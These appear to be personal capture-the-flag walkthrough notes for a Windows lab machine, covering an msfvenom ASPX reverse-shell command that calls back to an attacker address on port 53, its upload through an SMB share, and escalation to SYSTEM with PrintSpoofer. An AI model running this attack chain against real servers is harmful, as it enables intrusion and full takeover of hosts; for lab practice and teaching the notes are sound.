check port 49663
- vulnerable to CVE-2017-0143
- check nt4wrksv share, you will get bob and bill encoded credential( not useful)
- general msfvenom payload for reverse_shell
     ```
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.32.41 LPORT=53 -f aspx -o pwn.aspx
     ```
    - port 53 to bypass firewall.
    - put payload to smbclient //ip/nt4wrksv
    - start nc listener, and curl or access http://ip:49663/nt4wrksv.pwn.aspx
    - -f aspx: Format of output file: ASP.NET web shell (useful on IIS servers).
    - whoami /priv (command): used in a Windows shell (like CMD or a reverse shell) to display the privileges assigned to the current user.
    - `SeImpersonatePrivilege` (used in **token stealing**)
    - Get user.txt in Bob desktop using type command.
    - Use printspoofer for priv escalation.
    - **PrintSpoofer** is a **Windows privilege escalation tool** that exploits a vulnerability in the **Print Spooler service** to escalate from **local user** to **SYSTEM** (highest privilege on Windows).
    - Download the file from github ,and put in smbshare nt4wrksv share.
    - cd inetpub ->cd wwwroot -->cd nt4wrksv.(he `inetpub` directory is a default system folder on **Windows** used by **IIS (Internet Information Services)**.
    - type the command  `PrintSpoofer.exe -i -c cmd`:  used to **escalate privileges** to **SYSTEM** and open a **SYSTEM-level command prompt** using the PrintSpoofer exploit.
    - Escalated to system32, get root.txt  rom Administrator's Desktop.